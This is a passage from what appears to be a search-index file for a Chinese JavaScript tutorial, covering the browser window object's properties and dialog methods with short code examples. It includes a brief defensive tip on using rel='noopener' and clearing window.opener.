\u7684\u5199\u6cd5\u3002 \u53e6\u5916\uff0c\u5982\u679c <iframe> \u5143\u7d20\u8bbe\u7f6e\u4e86 name \u6216 id \u5c5e\u6027\uff0c\u90a3\u4e48\u5c5e\u6027\u503c\u4f1a\u81ea\u52a8\u6210\u4e3a\u5168\u5c40\u53d8\u91cf\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7 window.frames \u5c5e\u6027\u5f15\u7528\uff0c\u8fd4\u56de\u5b50\u7a97\u53e3\u7684 window \u5bf9\u8c61\u3002 1 2 3 // HTML \u4ee3\u7801\u4e3a <iframe id=\"myFrame\"> window . myFrame // [HTMLIFrameElement] frames . myframe === myFrame // true \u53e6\u5916\uff0c name \u5c5e\u6027\u7684\u503c\u4f1a\u81ea\u52a8\u6210\u4e3a\u5b50\u7a97\u53e3\u7684\u540d\u79f0\uff0c\u53ef\u4ee5\u7528\u5728 window.open \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u6216\u8005 <a> \u548c <frame> \u6807\u7b7e\u7684 target \u5c5e\u6027\u3002","title":"window \u5bf9\u8c61"},{"location":"bom/window/#window","text":"","title":"window \u5bf9\u8c61"},{"location":"bom/window/#_1","text":"\u6d4f\u89c8\u5668\u91cc\u9762\uff0c window \u5bf9\u8c61\uff08\u6ce8\u610f\uff0c w \u4e3a\u5c0f\u5199\uff09\u6307\u5f53\u524d\u7684\u6d4f\u89c8\u5668\u7a97\u53e3\u3002\u5b83\u4e5f\u662f\u5f53\u524d\u9875\u9762\u7684\u9876\u5c42\u5bf9\u8c61\uff0c\u5373\u6700\u9ad8\u4e00\u5c42\u7684\u5bf9\u8c61\uff0c\u6240\u6709\u5176\u4ed6\u5bf9\u8c61\u90fd\u662f\u5b83\u7684\u4e0b\u5c5e\u3002\u4e00\u4e2a\u53d8\u91cf\u5982\u679c\u672a\u58f0\u660e\uff0c\u90a3\u4e48\u9ed8\u8ba4\u5c31\u662f\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 1 2 a = 1 ; window . a // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u662f\u4e00\u4e2a\u6ca1\u6709\u58f0\u660e\u5c31\u76f4\u63a5\u8d4b\u503c\u7684\u53d8\u91cf\uff0c\u5b83\u81ea\u52a8\u6210\u4e3a\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 window \u6709\u81ea\u5df1\u7684\u5b9e\u4f53\u542b\u4e49\uff0c\u5176\u5b9e\u4e0d\u9002\u5408\u5f53\u4f5c\u6700\u9ad8\u4e00\u5c42\u7684\u9876\u5c42\u5bf9\u8c61\uff0c\u8fd9\u662f\u4e00\u4e2a\u8bed\u8a00\u7684\u8bbe\u8ba1\u5931\u8bef\u3002\u6700\u65e9\uff0c\u8bbe\u8ba1\u8fd9\u95e8\u8bed\u8a00\u7684\u65f6\u5019\uff0c\u539f\u59cb\u8bbe\u60f3\u662f\u8bed\u8a00\u5185\u7f6e\u7684\u5bf9\u8c61\u8d8a\u5c11\u8d8a\u597d\uff0c\u8fd9\u6837\u53ef\u4ee5\u63d0\u9ad8\u6d4f\u89c8\u5668\u7684\u6027\u80fd\u3002\u56e0\u6b64\uff0c\u8bed\u8a00\u8bbe\u8ba1\u8005 Brendan Eich \u5c31\u628a window \u5bf9\u8c61\u5f53\u4f5c\u9876\u5c42\u5bf9\u8c61\uff0c\u6240\u6709\u672a\u58f0\u660e\u5c31\u8d4b\u503c\u7684\u53d8\u91cf\u90fd\u81ea\u52a8\u53d8\u6210 window \u5bf9\u8c61\u7684\u5c5e\u6027\u3002\u8fd9\u79cd\u8bbe\u8ba1\u4f7f\u5f97\u7f16\u8bd1\u9636\u6bb5\u65e0\u6cd5\u68c0\u6d4b\u51fa\u672a\u58f0\u660e\u53d8\u91cf\uff0c\u4f46\u5230\u4e86\u4eca\u5929\u5df2\u7ecf\u6ca1\u6709\u529e\u6cd5\u7ea0\u6b63\u4e86\u3002","title":"\u6982\u8ff0"},{"location":"bom/window/#window_1","text":"","title":"window \u5bf9\u8c61\u7684\u5c5e\u6027"},{"location":"bom/window/#windowname","text":"window.name \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u540d\u5b57\u3002\u7a97\u53e3\u4e0d\u4e00\u5b9a\u9700\u8981\u540d\u5b57\uff0c\u8fd9\u4e2a\u5c5e\u6027\u4e3b\u8981\u914d\u5408\u8d85\u94fe\u63a5\u548c\u8868\u5355\u7684 target \u5c5e\u6027\u4f7f\u7528\u3002 1 2 3 window . name = 'Hello World!' ; console . log ( window . name ) // \"Hello World!\" \u8be5\u5c5e\u6027\u53ea\u80fd\u4fdd\u5b58\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u5199\u5165\u7684\u503c\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u4f1a\u81ea\u52a8\u8f6c\u6210\u5b57\u7b26\u4e32\u3002\u5404\u4e2a\u6d4f\u89c8\u5668\u5bf9\u8fd9\u4e2a\u503c\u7684\u50a8\u5b58\u5bb9\u91cf\u6709\u6240\u4e0d\u540c\uff0c\u4f46\u662f\u4e00\u822c\u6765\u8bf4\uff0c\u53ef\u4ee5\u9ad8\u8fbe\u51e0MB\u3002 \u53ea\u8981\u6d4f\u89c8\u5668\u7a97\u53e3\u4e0d\u5173\u95ed\uff0c\u8fd9\u4e2a\u5c5e\u6027\u662f\u4e0d\u4f1a\u6d88\u5931\u7684\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u8bbf\u95ee a.com \u65f6\uff0c\u8be5\u9875\u9762\u7684\u811a\u672c\u8bbe\u7f6e\u4e86 window.name \uff0c\u63a5\u4e0b\u6765\u5728\u540c\u4e00\u4e2a\u7a97\u53e3\u91cc\u9762\u8f7d\u5165\u4e86 b.com \uff0c\u65b0\u9875\u9762\u7684\u811a\u672c\u53ef\u4ee5\u8bfb\u5230\u4e0a\u4e00\u4e2a\u7f51\u9875\u8bbe\u7f6e\u7684 window.name \u3002\u9875\u9762\u5237\u65b0\u4e5f\u662f\u8fd9\u79cd\u60c5\u51b5\u3002\u4e00\u65e6\u6d4f\u89c8\u5668\u7a97\u53e3\u5173\u95ed\u540e\uff0c\u8be5\u5c5e\u6027\u4fdd\u5b58\u7684\u503c\u5c31\u4f1a\u6d88\u5931\uff0c\u56e0\u4e3a\u8fd9\u65f6\u7a97\u53e3\u5df2\u7ecf\u4e0d\u5b58\u5728\u4e86\u3002","title":"window.name"},{"location":"bom/window/#windowclosedwindowopener","text":"window.closed \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7a97\u53e3\u662f\u5426\u5173\u95ed\u3002 1 window . closed // false \u4e0a\u9762\u4ee3\u7801\u68c0\u67e5\u5f53\u524d\u7a97\u53e3\u662f\u5426\u5173\u95ed\u3002\u8fd9\u79cd\u68c0\u67e5\u610f\u4e49\u4e0d\u5927\uff0c\u56e0\u4e3a\u53ea\u8981\u80fd\u8fd0\u884c\u4ee3\u7801\uff0c\u5f53\u524d\u7a97\u53e3\u80af\u5b9a\u6ca1\u6709\u5173\u95ed\u3002\u8fd9\u4e2a\u5c5e\u6027\u4e00\u822c\u7528\u6765\u68c0\u67e5\uff0c\u4f7f\u7528\u811a\u672c\u6253\u5f00\u7684\u65b0\u7a97\u53e3\u662f\u5426\u5173\u95ed\u3002 1 2 3 4 5 var popup = window . open (); if (( popup !== null ) && ! popup . closed ) { // \u7a97\u53e3\u4ecd\u7136\u6253\u5f00\u7740 } window.opener \u5c5e\u6027\u8868\u793a\u6253\u5f00\u5f53\u524d\u7a97\u53e3\u7684\u7236\u7a97\u53e3\u3002\u5982\u679c\u5f53\u524d\u7a97\u53e3\u6ca1\u6709\u7236\u7a97\u53e3\uff08\u5373\u76f4\u63a5\u5728\u5730\u5740\u680f\u8f93\u5165\u6253\u5f00\uff09\uff0c\u5219\u8fd4\u56de null \u3002 1 window . open (). opener === window // true \u4e0a\u9762\u8868\u8fbe\u5f0f\u4f1a\u6253\u5f00\u4e00\u4e2a\u65b0\u7a97\u53e3\uff0c\u7136\u540e\u8fd4\u56de true \u3002 \u5982\u679c\u4e24\u4e2a\u7a97\u53e3\u4e4b\u95f4\u4e0d\u9700\u8981\u901a\u4fe1\uff0c\u5efa\u8bae\u5c06\u5b50\u7a97\u53e3\u7684 opener \u5c5e\u6027\u663e\u5f0f\u8bbe\u4e3a null \uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u4e00\u4e9b\u5b89\u5168\u9690\u60a3\u3002 1 2 var newWin = window . open ( 'example.html' , 'newWindow' , 'height=400,width=400' ); newWin . opener = null ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7a97\u53e3\u7684 opener \u5c5e\u6027\u8bbe\u4e3a null \uff0c\u4e24\u4e2a\u7a97\u53e3\u4e4b\u95f4\u5c31\u6ca1\u529e\u6cd5\u518d\u8054\u7cfb\u4e86\u3002 \u901a\u8fc7 opener \u5c5e\u6027\uff0c\u53ef\u4ee5\u83b7\u5f97\u7236\u7a97\u53e3\u7684\u5168\u5c40\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u4f46\u53ea\u9650\u4e8e\u4e24\u4e2a\u7a97\u53e3\u540c\u6e90\u7684\u60c5\u51b5\uff08\u53c2\u89c1\u300a\u540c\u6e90\u9650\u5236\u300b\u4e00\u7ae0\uff09\uff0c\u4e14\u5176\u4e2d\u4e00\u4e2a\u7a97\u53e3\u7531\u53e6\u4e00\u4e2a\u6253\u5f00\u3002 <a> \u5143\u7d20\u6dfb\u52a0 rel=\"noopener\" \u5c5e\u6027\uff0c\u53ef\u4ee5\u9632\u6b62\u65b0\u6253\u5f00\u7684\u7a97\u53e3\u83b7\u53d6\u7236\u7a97\u53e3\uff0c\u51cf\u8f7b\u88ab\u6076\u610f\u7f51\u7ad9\u4fee\u6539\u7236\u7a97\u53e3 URL \u7684\u98ce\u9669\u3002 1 2 3 < a href = \"https://an.evil.site\" target = \"_blank\" rel = \"noopener\" > \u6076\u610f\u7f51\u7ad9 </ a >","title":"window.closed\uff0cwindow.opener"},{"location":"bom/window/#windowselfwindowwindow","text":"window.self \u548c window.window \u5c5e\u6027\u90fd\u6307\u5411\u7a97\u53e3\u672c\u8eab\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u53ea\u8bfb\u3002 1 2 window . self === window // true window . window === window // true","title":"window.self\uff0cwindow.window"},{"location":"bom/window/#windowframeswindowlength","text":"window.frames \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6210\u5458\u4e3a\u9875\u9762\u5185\u6240\u6709\u6846\u67b6\u7a97\u53e3\uff0c\u5305\u62ec frame \u5143\u7d20\u548c iframe \u5143\u7d20\u3002 window.frames[0] \u8868\u793a\u9875\u9762\u4e2d\u7b2c\u4e00\u4e2a\u6846\u67b6\u7a97\u53e3\u3002 \u5982\u679c iframe \u5143\u7d20\u8bbe\u7f6e\u4e86 id \u6216 name \u5c5e\u6027\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u7528\u5c5e\u6027\u503c\uff0c\u5f15\u7528\u8fd9\u4e2a iframe \u7a97\u53e3\u3002\u6bd4\u5982 <iframe name=\"myIFrame\"> \u53ef\u4ee5\u7528 frames['myIFrame'] \u6216\u8005 frames.myIFrame \u6765\u5f15\u7528\u3002 frames \u5c5e\u6027\u5b9e\u9645\u4e0a\u662f window \u5bf9\u8c61\u7684\u522b\u540d\u3002 1 frames === window // true \u56e0\u6b64\uff0c frames[0] \u4e5f\u53ef\u4ee5\u7528 window[0] \u8868\u793a\u3002\u4f46\u662f\uff0c\u4ece\u8bed\u4e49\u4e0a\u770b\uff0c frames \u66f4\u6e05\u6670\uff0c\u800c\u4e14\u8003\u8651\u5230 window \u8fd8\u662f\u5168\u5c40\u5bf9\u8c61\uff0c\u56e0\u6b64\u63a8\u8350\u8868\u793a\u591a\u7a97\u53e3\u65f6\uff0c\u603b\u662f\u4f7f\u7528 frames[0] \u7684\u5199\u6cd5\u3002\u66f4\u591a\u4ecb\u7ecd\u8bf7\u770b\u4e0b\u6587\u7684\u300a\u591a\u7a97\u53e3\u64cd\u4f5c\u300b\u90e8\u5206\u3002 window.length \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u7f51\u9875\u5305\u542b\u7684\u6846\u67b6\u603b\u6570\u3002\u5982\u679c\u5f53\u524d\u7f51\u9875\u4e0d\u5305\u542b frame \u548c iframe \u5143\u7d20\uff0c\u90a3\u4e48 window.length \u5c31\u8fd4\u56de 0 \u3002 1 window . frames . length === window . length // true \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c window.frames.length \u4e0e window.length \u5e94\u8be5\u662f\u76f8\u7b49\u7684\u3002","title":"window.frames\uff0cwindow.length"},{"location":"bom/window/#windowframeelement","text":"window.frameElement \u5c5e\u6027\u4e3b\u8981\u7528\u4e8e\u5f53\u524d\u7a97\u53e3\u5d4c\u5728\u53e6\u4e00\u4e2a\u7f51\u9875\u7684\u60c5\u51b5\uff08\u5d4c\u5165 <object> \u3001 <iframe> \u6216 <embed> \u5143\u7d20\uff09\uff0c\u8fd4\u56de\u5f53\u524d\u7a97\u53e3\u6240\u5728\u7684\u90a3\u4e2a\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u5f53\u524d\u7a97\u53e3\u662f\u9876\u5c42\u7a97\u53e3\uff0c\u6216\u8005\u6240\u5d4c\u5165\u7684\u90a3\u4e2a\u7f51\u9875\u4e0d\u662f\u540c\u6e90\u7684\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u5982\u4e0b // <iframe src=\"about.html\"></iframe> // \u4e0b\u9762\u7684\u811a\u672c\u5728 about.html \u91cc\u9762 var frameEl = window . frameElement ; if ( frameEl ) { frameEl . src = 'other.html' ; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c frameEl \u53d8\u91cf\u5c31\u662f <iframe> \u5143\u7d20\u3002","title":"window.frameElement"},{"location":"bom/window/#windowtopwindowparent","text":"window.top \u5c5e\u6027\u6307\u5411\u6700\u9876\u5c42\u7a97\u53e3\uff0c\u4e3b\u8981\u7528\u4e8e\u5728\u6846\u67b6\u7a97\u53e3\uff08frame\uff09\u91cc\u9762\u83b7\u53d6\u9876\u5c42\u7a97\u53e3\u3002 window.parent \u5c5e\u6027\u6307\u5411\u7236\u7a97\u53e3\u3002\u5982\u679c\u5f53\u524d\u7a97\u53e3\u6ca1\u6709\u7236\u7a97\u53e3\uff0c window.parent \u6307\u5411\u81ea\u8eab\u3002 1 2 3 if ( window . parent !== window . top ) { // \u8868\u660e\u5f53\u524d\u7a97\u53e3\u5d4c\u5165\u4e0d\u6b62\u4e00\u5c42 } \u5bf9\u4e8e\u4e0d\u5305\u542b\u6846\u67b6\u7684\u7f51\u9875\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u7b49\u540c\u4e8e window \u5bf9\u8c61\u3002","title":"window.top\uff0cwindow.parent"},{"location":"bom/window/#windowstatus","text":"window.status \u5c5e\u6027\u7528\u4e8e\u8bfb\u5199\u6d4f\u89c8\u5668\u72b6\u6001\u680f\u7684\u6587\u672c\u3002\u4f46\u662f\uff0c\u73b0\u5728\u5f88\u591a\u6d4f\u89c8\u5668\u90fd\u4e0d\u5141\u8bb8\u6539\u5199\u72b6\u6001\u680f\u6587\u672c\uff0c\u6240\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u4e00\u5b9a\u6709\u6548\u3002","title":"window.status"},{"location":"bom/window/#windowdevicepixelratio","text":"window.devicePixelRatio \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6570\u503c\uff0c\u8868\u793a\u4e00\u4e2a CSS \u50cf\u7d20\u7684\u5927\u5c0f\u4e0e\u4e00\u4e2a\u7269\u7406\u50cf\u7d20\u7684\u5927\u5c0f\u4e4b\u95f4\u7684\u6bd4\u7387\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u8868\u793a\u4e00\u4e2a CSS \u50cf\u7d20\u7531\u591a\u5c11\u4e2a\u7269\u7406\u50cf\u7d20\u7ec4\u6210\u3002\u5b83\u53ef\u4ee5\u7528\u4e8e\u5224\u65ad\u7528\u6237\u7684\u663e\u793a\u73af\u5883\uff0c\u5982\u679c\u8fd9\u4e2a\u6bd4\u7387\u8f83\u5927\uff0c\u5c31\u8868\u793a\u7528\u6237\u6b63\u5728\u4f7f\u7528\u9ad8\u6e05\u5c4f\u5e55\uff0c\u56e0\u6b64\u53ef\u4ee5\u663e\u793a\u8f83\u5927\u50cf\u7d20\u7684\u56fe\u7247\u3002","title":"window.devicePixelRatio"},{"location":"bom/window/#_2","text":"\u4ee5\u4e0b\u5c5e\u6027\u8fd4\u56de window \u5bf9\u8c61\u7684\u4f4d\u7f6e\u4fe1\u606f\u548c\u5927\u5c0f\u4fe1\u606f\u3002 \uff081\uff09window.screenX\uff0cwindow.screenY window.screenX \u548c window.screenY \u5c5e\u6027\uff0c\u8fd4\u56de\u6d4f\u89c8\u5668\u7a97\u53e3\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e\u5f53\u524d\u5c4f\u5e55\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u8ddd\u79bb\u548c\u5782\u76f4\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u53ea\u8bfb\u3002 \uff082\uff09 window.innerHeight\uff0cwindow.innerWidth window.innerHeight \u548c window.innerWidth \u5c5e\u6027\uff0c\u8fd4\u56de\u7f51\u9875\u5728\u5f53\u524d\u7a97\u53e3\u4e2d\u53ef\u89c1\u90e8\u5206\u7684\u9ad8\u5ea6\u548c\u5bbd\u5ea6\uff0c\u5373\u201c\u89c6\u53e3\u201d\uff08viewport\uff09\u7684\u5927\u5c0f\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u53ea\u8bfb\u3002 \u7528\u6237\u653e\u5927\u7f51\u9875\u7684\u65f6\u5019\uff08\u6bd4\u5982\u5c06\u7f51\u9875\u4ece100%\u7684\u5927\u5c0f\u653e\u5927\u4e3a200%\uff09\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u4f1a\u53d8\u5c0f\u3002\u56e0\u4e3a\u8fd9\u65f6\u7f51\u9875\u7684\u50cf\u7d20\u5927\u5c0f\u4e0d\u53d8\uff08\u6bd4\u5982\u5bbd\u5ea6\u8fd8\u662f960\u50cf\u7d20\uff09\uff0c\u53ea\u662f\u6bcf\u4e2a\u50cf\u7d20\u5360\u636e\u7684\u5c4f\u5e55\u7a7a\u95f4\u53d8\u5927\u4e86\uff0c\u56e0\u6b64\u53ef\u89c1\u90e8\u5206\uff08\u89c6\u53e3\uff09\u5c31\u53d8\u5c0f\u4e86\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u503c\u5305\u62ec\u6eda\u52a8\u6761\u7684\u9ad8\u5ea6\u548c\u5bbd\u5ea6\u3002 \uff083\uff09window.outerHeight\uff0cwindow.outerWidth window.outerHeight \u548c window.outerWidth \u5c5e\u6027\u8fd4\u56de\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u9ad8\u5ea6\u548c\u5bbd\u5ea6\uff0c\u5305\u62ec\u6d4f\u89c8\u5668\u83dc\u5355\u548c\u8fb9\u6846\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u53ea\u8bfb\u3002 \uff084\uff09window.scrollX\uff0cwindow.scrollY window.scrollX \u5c5e\u6027\u8fd4\u56de\u9875\u9762\u7684\u6c34\u5e73\u6eda\u52a8\u8ddd\u79bb\uff0c window.scrollY \u5c5e\u6027\u8fd4\u56de\u9875\u9762\u7684\u5782\u76f4\u6eda\u52a8\u8ddd\u79bb\uff0c\u5355\u4f4d\u90fd\u4e3a\u50cf\u7d20\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u53ea\u8bfb\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u7684\u8fd4\u56de\u503c\u4e0d\u662f\u6574\u6570\uff0c\u800c\u662f\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u3002\u5982\u679c\u9875\u9762\u6ca1\u6709\u6eda\u52a8\uff0c\u5b83\u4eec\u7684\u503c\u5c31\u662f 0 \u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5982\u679c\u7528\u6237\u5411\u4e0b\u62c9\u52a8\u4e86\u5782\u76f4\u6eda\u52a8\u676175\u50cf\u7d20\uff0c\u90a3\u4e48 window.scrollY \u5c31\u662f75\u5de6\u53f3\u3002\u7528\u6237\u6c34\u5e73\u5411\u53f3\u62c9\u52a8\u6c34\u5e73\u6eda\u52a8\u6761200\u50cf\u7d20\uff0c window.scrollX \u5c31\u662f200\u5de6\u53f3\u3002 1 2 3 if ( window . scrollY < 75 ) { window . scroll ( 0 , 75 ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u9875\u9762\u5411\u4e0b\u6eda\u52a8\u7684\u8ddd\u79bb\u5c0f\u4e8e75\u50cf\u7d20\uff0c\u90a3\u4e48\u9875\u9762\u5411\u4e0b\u6eda\u52a875\u50cf\u7d20\u3002 \uff085\uff09window.pageXOffset\uff0cwindow.pageYOffset window.pageXOffset \u5c5e\u6027\u548c window.pageYOffset \u5c5e\u6027\uff0c\u662f window.scrollX \u548c window.scrollY \u522b\u540d\u3002","title":"\u4f4d\u7f6e\u5927\u5c0f\u5c5e\u6027"},{"location":"bom/window/#_3","text":"\u7ec4\u4ef6\u5c5e\u6027\u8fd4\u56de\u6d4f\u89c8\u5668\u7684\u7ec4\u4ef6\u5bf9\u8c61\u3002\u8fd9\u6837\u7684\u5c5e\u6027\u6709\u4e0b\u9762\u51e0\u4e2a\u3002 window.locationbar \uff1a\u5730\u5740\u680f\u5bf9\u8c61 window.menubar \uff1a\u83dc\u5355\u680f\u5bf9\u8c61 window.scrollbars \uff1a\u7a97\u53e3\u7684\u6eda\u52a8\u6761\u5bf9\u8c61 window.toolbar \uff1a\u5de5\u5177\u680f\u5bf9\u8c61 window.statusbar \uff1a\u72b6\u6001\u680f\u5bf9\u8c61 window.personalbar \uff1a\u7528\u6237\u5b89\u88c5\u7684\u4e2a\u4eba\u5de5\u5177\u680f\u5bf9\u8c61 \u8fd9\u4e9b\u5bf9\u8c61\u7684 visible \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8fd9\u4e9b\u7ec4\u4ef6\u662f\u5426\u53ef\u89c1\u3002\u8fd9\u4e9b\u5c5e\u6027\u53ea\u8bfb\u3002 1 2 3 4 5 6 window . locationbar . visible window . menubar . visible window . scrollbars . visible window . toolbar . visible window . statusbar . visible window . personalbar . visible","title":"\u7ec4\u4ef6\u5c5e\u6027"},{"location":"bom/window/#_4","text":"\u5168\u5c40\u5bf9\u8c61\u5c5e\u6027\u6307\u5411\u4e00\u4e9b\u6d4f\u89c8\u5668\u539f\u751f\u7684\u5168\u5c40\u5bf9\u8c61\u3002 window.document \uff1a\u6307\u5411 document \u5bf9\u8c61\uff0c\u8be6\u89c1\u300adocument \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u5c5e\u6027\u6709\u540c\u6e90\u9650\u5236\u3002\u53ea\u6709\u6765\u81ea\u540c\u6e90\u7684\u811a\u672c\u624d\u80fd\u8bfb\u53d6\u8fd9\u4e2a\u5c5e\u6027\u3002 window.location \uff1a\u6307\u5411 Location \u5bf9\u8c61\uff0c\u7528\u4e8e\u83b7\u53d6\u5f53\u524d\u7a97\u53e3\u7684 URL \u4fe1\u606f\u3002\u5b83\u7b49\u540c\u4e8e document.location \u5c5e\u6027\uff0c\u8be6\u89c1\u300aLocation \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002 window.navigator \uff1a\u6307\u5411 Navigator \u5bf9\u8c61\uff0c\u7528\u4e8e\u83b7\u53d6\u73af\u5883\u4fe1\u606f\uff0c\u8be6\u89c1\u300aNavigator \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002 window.history \uff1a\u6307\u5411 History \u5bf9\u8c61\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u7684\u6d4f\u89c8\u5386\u53f2\uff0c\u8be6\u89c1\u300aHistory \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002 window.localStorage \uff1a\u6307\u5411\u672c\u5730\u50a8\u5b58\u7684 localStorage \u6570\u636e\uff0c\u8be6\u89c1\u300aStorage \u63a5\u53e3\u300b\u4e00\u7ae0\u3002 window.sessionStorage \uff1a\u6307\u5411\u672c\u5730\u50a8\u5b58\u7684 sessionStorage \u6570\u636e\uff0c\u8be6\u89c1\u300aStorage \u63a5\u53e3\u300b\u4e00\u7ae0\u3002 window.console \uff1a\u6307\u5411 console \u5bf9\u8c61\uff0c\u7528\u4e8e\u64cd\u4f5c\u63a7\u5236\u53f0\uff0c\u8be6\u89c1\u300aconsole \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002 window.screen \uff1a\u6307\u5411 Screen \u5bf9\u8c61\uff0c\u8868\u793a\u5c4f\u5e55\u4fe1\u606f\uff0c\u8be6\u89c1\u300aScreen \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002","title":"\u5168\u5c40\u5bf9\u8c61\u5c5e\u6027"},{"location":"bom/window/#windowissecurecontext","text":"window.isSecureContext \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u7a97\u53e3\u662f\u5426\u5904\u5728\u52a0\u5bc6\u73af\u5883\u3002\u5982\u679c\u662f HTTPS \u534f\u8bae\uff0c\u5c31\u662f true \uff0c\u5426\u5219\u5c31\u662f false \u3002","title":"window.isSecureContext"},{"location":"bom/window/#window_2","text":"","title":"window \u5bf9\u8c61\u7684\u65b9\u6cd5"},{"location":"bom/window/#windowalertwindowpromptwindowconfirm","text":"window.alert() \u3001 window.prompt() \u3001 window.confirm() \u90fd\u662f\u6d4f\u89c8\u5668\u4e0e\u7528\u6237\u4e92\u52a8\u7684\u5168\u5c40\u65b9\u6cd5\u3002\u5b83\u4eec\u4f1a\u5f39\u51fa\u4e0d\u540c\u7684\u5bf9\u8bdd\u6846\uff0c\u8981\u6c42\u7528\u6237\u505a\u51fa\u56de\u5e94\u3002\u6ce8\u610f\uff0c\u8fd9\u4e09\u4e2a\u65b9\u6cd5\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\uff0c\u90fd\u662f\u6d4f\u89c8\u5668\u7edf\u4e00\u89c4\u5b9a\u7684\u5f0f\u6837\uff0c\u65e0\u6cd5\u5b9a\u5236\u3002 \uff081\uff09window.alert() window.alert() \u65b9\u6cd5\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\uff0c\u53ea\u6709\u4e00\u4e2a\u201c\u786e\u5b9a\u201d\u6309\u94ae\uff0c\u5f80\u5f80\u7528\u6765\u901a\u77e5\u7528\u6237\u67d0\u4e9b\u4fe1\u606f\u3002 1 window . alert ( 'Hello World' ); \u7528\u6237\u53ea\u6709\u70b9\u51fb\u201c\u786e\u5b9a\u201d\u6309\u94ae\uff0c\u5bf9\u8bdd\u6846\u624d\u4f1a\u6d88\u5931\u3002\u5bf9\u8bdd\u6846\u5f39\u51fa\u671f\u95f4\uff0c\u6d4f\u89c8\u5668\u7a97\u53e3\u5904\u4e8e\u51bb\u7ed3\u72b6\u6001\uff0c\u5982\u679c\u4e0d\u70b9\u201c\u786e\u5b9a\u201d\u6309\u94ae\uff0c\u7528\u6237\u4ec0\u4e48\u4e5f\u5e72\u4e0d\u4e86\u3002 window.alert() \u65b9\u6cd5\u7684\u53c2\u6570\u53ea\u80fd\u662f\u5b57\u7b26\u4e32\uff0c\u6ca1\u6cd5\u4f7f\u7528 CSS \u6837\u5f0f\uff0c\u4f46\u662f\u53ef\u4ee5\u7528 \\n \u6307\u5b9a\u6362\u884c\u3002 1 alert ( '\u672c\u6761\u63d0\u793a\\n\u5206\u6210\u4e24\u884c' ); \uff082\uff09window.prompt() window.prompt() \u65b9\u6cd5\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\uff0c\u63d0\u793a\u6587\u5b57\u7684\u4e0b\u65b9\uff0c\u8fd8\u6709\u4e00\u4e2a\u8f93\u5165\u6846\uff0c\u8981\u6c42\u7528\u6237\u8f93\u5165\u4fe1\u606f\uff0c\u5e76\u6709\u201c\u786e\u5b9a\u201d\u548c\u201c\u53d6\u6d88\u201d\u4e24\u4e2a\u6309\u94ae\u3002\u5b83\u5f80\u5f80\u7528\u6765\u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u3002 1 var result = prompt ( '\u60a8\u7684\u5e74\u9f84\uff1f' , 25 ) 